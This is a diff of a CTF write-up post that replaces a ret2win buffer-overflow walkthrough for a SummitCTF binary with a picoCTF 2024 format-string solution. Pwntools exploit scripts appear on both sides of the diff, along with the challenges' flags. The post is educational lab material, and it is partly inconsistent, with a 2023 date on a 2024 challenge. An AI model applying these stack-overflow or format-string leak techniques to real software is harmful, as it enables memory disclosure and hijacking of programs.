@@ -1,7 +1,7 @@
 ---
 title: "Format String 1 (picoCTF 2024)"
-summary: "Easy pwn Challenge - format string vuln"
-description: "Easy pwn Challenge - format string vuln"
+summary: "Easy pwn chal - format string vuln"
+description: "Easy pwn chal - format string vuln"
 tags: [pwn, easy, writeup]
 date: 2023-04-23T22:00:00-05:00
 draft: false
@@ -22,89 +22,37 @@ Given files: [format-string-1](/picoctf-format-string-1/format-string-1) [format
 
 ## Writeup
 
-I'm going to use GDB with the [pwndbg](https://github.com/pwndbg/pwndbg) plugin for this challenge. Run `gdb <file>`
 
-![name](/summitctf-simple-stack-smash/2023-04-23-21-44-48.png#center)
-
-Here is the main function revealed in Ghidra:
-
-```c
-undefined4 main(void)
-{
-  char name_input [16];
-  
-  setvbuf(stdout,(char *)0,2,0);
-  setvbuf(stderr,(char *)0,2,0);
-  printf("Please enter your name: ");
-  fgets(name_input,1024,stdin);
-  printf("Hello, %s!\n",name_input);
-  return 0;
-}
-```
-Curiously, there exists a `win` function:
-
-```c
-void win(void)
-{
-  system("cat /src/flag.txt");
-  exit(0);
-}
-```
-
-A ret2win challenge, where the objective is to redirect execution to the win function (`win_addr`). To do so, we need to figure out at what point of our input, the buffer overflow occurs (`offset`).
-
-In gdb, `info fun win`: gives us the win_addr =` 0x08049216`
-
-To find the offset we send a bunch of strings in the following cyclic pattern:
-`aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa..` to find until what letter can the stack hold.
-```py
-#!/usr/bin/python3
-
-from pwn import *
-
-elf = ELF("./simple-stack-smash")
-p = elf.process()
-win_addr = 0x08049216
-
-context.binary = elf
-context.log_level = "DEBUG"
-gdb.attach(p)
-
-p.sendline(cyclic(100))  # send pattern
-p.interactive()  
-# run script, enter 'c' in gdb to continue
-```
-We can see in gdb that the program SEGFAULTed when it's `%EIP` was pointing to 'gaaa' which caused the buffer overflow. If you're unfamiliar with assembly registers, `%EIP` is the instruction pointer which tells the computer what the next command is that must be executed. After making `%EIP` to point to our win function, we get the flag.
-
-![name](/summitctf-simple-stack-smash/2023-04-23-23-04.png#center)
-
-&nbsp;
 
 ### Solve script
-Completing the script:
-```py
-#!/usr/bin/python3
 
+```py
 from pwn import *
 
-elf = ELF("./simple-stack-smash")
-p = elf.process()
-win_addr = 0x08049216
+elf = ELF('./format-string-1')
 
-context.binary = elf
+host = <'host'>
+port = <port>
+# p = remote(host, port)
 
-# context.log_level = "DEBUG"
-# gdb.attach(p)
-# p.sendline(cyclic(100))  # sending pattern
+s = ""
+orders = []
+for i in range (14,30):
+    p = remote(host, port)
+    # p = elf.process()
+    format_s = b"".join([b"%" + str(i).encode("utf-8") + b"$lx"])
+    p.recvuntil(b":")
+    p.sendline(format_s)
+    out = p.recvall().decode('utf-8').strip().split(" ")[3].splitlines()[0]
+    orders.append(out)
 
-offset = cyclic_find("gaaa")
-
-p.sendlineafter(b"name: ", b"A" * offset + p32(win_addr))
-p.interactive()
+orders.reverse()
+print(orders)
+print(''.join(orders))
 ```
 
 ## Flag
 
-`summitCTF{G1mMI3_S0M3th1NG_H4rD3r_PlZ}`
+`picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}`
 
 ---
